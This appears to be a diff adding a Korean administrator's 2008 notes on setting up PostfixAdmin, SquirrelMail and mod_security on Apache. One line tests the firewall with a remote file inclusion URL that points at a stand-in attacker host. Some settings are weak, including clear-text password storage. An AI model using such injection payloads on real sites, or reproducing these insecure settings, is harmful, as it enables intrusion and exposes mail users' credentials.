@@ -1,0 +1,176 @@
+
+2008.02.28
+ 
+postfixadmin-2.2.0-RC1.tar.gz ==> 안됨
+postfixadmin-2.1.0.gz ==> 잘됨
+ 
+#mkdir /home/webmail
+ 
+#tar xvfz  postfixadmin-2.1.0.gz -C /home/webmail/
+ 
+#cd /home/webmail/postfix-2.1.0/
+ 
+#vi DATABASE_MYSQL.txt
+INSERT INTO user (Host, User, Password) VALUES ('localhost','postfix',password('암호'));
+INSERT INTO user (Host, User, Password) VALUES ('localhost','postfixadmin',password('암호'));
+#mysql -uroot -p <  DATABASE_MYSQL.txt
+ 
+#cp config.inc.php.sample config.inc.php
+ 
+#vi config.inc.php
+     ==================================================
+    $CONF['database_host'] = '127.0.0.1';
+    $CONF['database_password'] = '암호';
+    $CONF['encrypt'] = 'clear';
+    $CONF['aliases'] = '0';
+    $CONF['mailboxes'] = '0';
+    $CONF['maxquota'] = '0';
+     ==================================================
+#vi /etc/httpd/conf/httpd.conf
+     ==================================================
+    NameVirtualHost *:80
+    <VirtualHost *:80>
+       ServerAdmin webmaster@dummy-host.example.com
+       DocumentRoot /home/webmail
+       ServerName mail.BBBBB.org
+       ErrorLog logs/mail.BBBBB.org-error_log
+       CustomLog logs/mail.BBBBB.org-access_log common
+ 
+       Alias /postfixadmin/ "/home/webmail/postfixadmin-2.1.0/"
+ 
+       <Directory "/home/webmail/postfixadmin-2.1.0">
+           Options Indexes
+           AllowOverride AuthConfig
+           Order allow,deny
+           Allow from all
+       </Directory>
+   </VirtualHost>
+     ==================================================
+ 
+#/home/webmail/postfixadmin-2.1.0/admin/.htaccess
+     ==================================================
+     AuthUserFile /home/webmail/postfixadmin-2.1.0/admin/.htpasswd
+     ==================================================
+#htpasswd -c /home/webmail/postfixadmin-2.1.0/admin/.htpasswd postfixadmin@BBBBB.org
+ 
+# http://ip/postfixadmin/ 방문 (ID/암호는 htpasswd로 입력한 ID/암호로 사용)
+   (아래 화면은 setup.php이 존재할때 나타나는 화면으로,
+    추후 DB에 저장되어 있는 관리자ID및 암호를 분실했을때,
+    백업해 둔 setup.php.orig를 setup.php로 mv하면 됨)
+  
+ 
+   setup클릭
+  
+ 
+   admin section 클릭(htpasswd로 생성한 ID와 암호 입력)
+  
+ 
+  
+ 
+   .New Domain 클릭후 도메인 추가시 The domain already exists! 오류날때
+   ==> php.ini
+         magic_quotes_gpc = Off --> On으로 변경
+   .도메인 추가 후 admin계정 추가(postfixadmin@BBBBB.org)
+   .도메인 관리자 계정을 생성하였으면
+    #mv setup.php setup.php.orig 하여
+    http://218.237.65.48/postfixadmin/방문
+   .일반 사용자 추가 (active,creation mailbox 체크상태로)
+ 
+squirrelmail 설정
+    download : http://www.squirrelmail.org
+
+    squirrelmail-1.4.13.tar.gz
+    언어팩 all_locales-1.4.13-20071220.tar.gz
+ 
+   #tar xvfz squirrelmail-1.4.13.tar.gz -C /home/webmail/
+   #tar xvfz all_locales-1.4.13-2007122070106.tar.gz -C /home/webmail/squirrelmail-1.4.13
+   #chown -R apache.apache /home/squirrelmail-1.4.13
+   #chmod -R 750 /home/squirrelmail-1.4.13
+   
+   #mkdir /var/squirrelmail
+   #mkdir /var/squirrelmail/data
+   #mkdir /var/squirrelmail/attach
+ 
+   #cp /home/squirrelmail-1.4.13/data/default_pref /var/squirrelmail/data
+   #chown -R apache.apache /var/squirrelmail
+   #chmod -R 0770 /var/squirrelmail/data
+   #chmod -R 0730 /var/squirrelmail/attach
+ 
+   #cd  /home/squirrelmail-1.4.13
+   #./configure
+ 
+     ==================================================
+   1. Organization Preferences
+    => 7.  Provider link          : http://www.BBBBB.org/
+   2.  Server Settings
+    => 1.  Domain                 : BBBBB.org
+   3.  Folder Defaults
+    => 3.  Trash Folder                  : INBOX/Trash
+        4.  Sent Folder                   : INBOX/Sent
+        5.  Drafts Folder                 : INBOX/Drafts
+        14. Default Unseen Notify         : 3
+       15. Default Unseen Type           : 2
+   4.  General Options
+    => 1.  Data Directory              : /var/squirrelmail/data/
+       2.  Attachment Directory        : /var/squirrelmail/attach/
+       7.  Hide SM attributions        : true
+   10. Languages
+    => 1.  Default Language       : ko_KR
+       2.  Default Charset        : EUC-KR
+     ==================================================
+-----------------------------
+3. httpd.conf 추가
+-----------------------------
+   Alias /webmail /home/squirrelmail-1.4.13
+ 
+
+  
+-----------------------------
+5. plugins 설치 (웹에디터 : HTML Mail)
+-----------------------------
+   Download : HTML Mail 2.3
+   squirrelmail.org > Downloads > Plugins > Compose > Html Mail
+ 
+   #tar xvfz /usr/local/src/html_mail-2.3-1.4.tar.gz -C /home/squirrelmail-1.4.13/plugins/
+   #cd /home/squirrelmail-1.4.10a/plugins/html_mail
+   #cp config.php.sample config.php
+   #/home/squirrelmail-1.4.10a/configure
+    8.Plugins
+      Available Plugins: 리스트에 있는 HTML Mail 번호를 클릭하여 
+      Installed Plugins: 리스트에 나타나게
+    save
+ 
+   확인 : 로그인후 편지쓰기 [Compose in HTML] 버튼 클릭
+ 
+  
+mysql 3.23 --> mysql 4.1이전시
+필드수가 안맞아 restore가 안될 경우
+ 
+소스 mysql에서
+select * into outfile '17_db.sql' from db;   ==> /home/mysql-data/mysql/17_db.sql에 저장됨
+ 
+대상 mysql에서
+load data infile '17_db.sql' into table db; <== /home/mysql-data/mysql/17_db.sql의 파일을 읽어들임
+ 
+===============================
+modsecurity-apache_1.9.5.tar.tar
+===============================
+ 
+#tar xvfz modsecurity-apache_1.9.5.tar.tar
+#apxs -cia /usr/local/src/modsecurity-apache_1.9.5/apache2/mod_security.c
+ 
+#vi httpd.conf
+Include conf/modsecurity.conf
+#cp cp /usr/local/src/modsecurity_SMB_071120.conf modsecurity.conf
+#apachectl restart
+ 
+확인 http://www.BBBBB.org/vul.php?page=http://attacker.com/attacker.html
+ 
+tail -f /var/log/httpd/modsec_audit.log
+ 
+ 
+spamassassin
+ 
+http://mirr.springnote.com/pages/382205
+ 
+ 
